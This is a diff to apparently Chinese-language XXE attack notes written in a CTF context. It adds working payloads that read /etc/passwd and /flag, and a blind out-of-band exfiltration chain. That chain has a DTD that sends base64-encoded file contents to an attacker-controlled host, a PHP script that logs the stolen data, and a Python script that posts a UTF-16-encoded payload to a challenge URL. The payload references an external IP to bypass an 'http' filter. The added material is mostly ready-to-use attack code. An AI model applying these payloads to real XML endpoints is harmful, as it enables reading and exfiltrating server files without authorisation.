@@ -46,8 +46,8 @@ PS：libxml 2.9.0以后的默认不解析外部实体，现在大多数为2.9.4�
 响应会引用实体，会回显“文本内容”，则验证成功。
 ```
 外部实体注入文件读取：
-<!ENTITY b SYSTEM "file///etc/passwd">
-xml中引用&b
+<!ENTITY b SYSTEM "file:///etc/passwd">
+xml中引用&b;
 
 如：
 <?xml version="1.0"?>
@@ -67,6 +67,10 @@ soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
 </soapenv:Envelope>
 响应有回显&test;的内容，即/etc/password
 
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
+<data>&xxe;</data>
 
 
 
@@ -126,3 +130,58 @@ xxe.dtd
 ```
 get请求url最好全编码，而不是只有url路径编码。
 <https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE>
+
+
+^
+### 3.无回显XXE文件读取：
+服务器文件pd.dtd
+```
+<!ENTITY % all
+"<!ENTITY &#x25; send SYSTEM 'http://xxx/xxe.php?q=%file;'>"
+>
+%all;
+```
+用php接收
+```
+# xxe.php
+<?php
+highlight_file(__FILE__);
+$xxe = ($_GET['q']);
+$txt = 'flag.txt';
+file_put_contents($txt,$xxe,FILE_APPEND)
+?>
+```
+注入点。不需要xml也可以，可用于绕过检测xml。
+```
+[POST]Payload:
+
+<!DOCTYPE ANY [
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
+<!ENTITY % dtd SYSTEM "http://xxx/pd.dtd">
+%dtd;
+%send;
+] >
+```
+
+^
+
+
+### 4.无回显XXE文件读取，过滤了http字符：
+用python编码绕过
+```
+import requests
+
+# 过滤了http，还不回显，使用utf-16编码绕过
+url = 'http://5ca0be81-2f45-4f3f-8774-94d39b117ffc.challenge.ctf.show/'
+data = """<!DOCTYPE ANY [
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
+<!ENTITY % dtd SYSTEM "http://1.92.88.247/xxe/pd.dtd">
+%dtd;
+%send;
+] >"""
+
+requests.post(url ,data=data.encode('utf-16'))
+print("done!")
+```
+
+
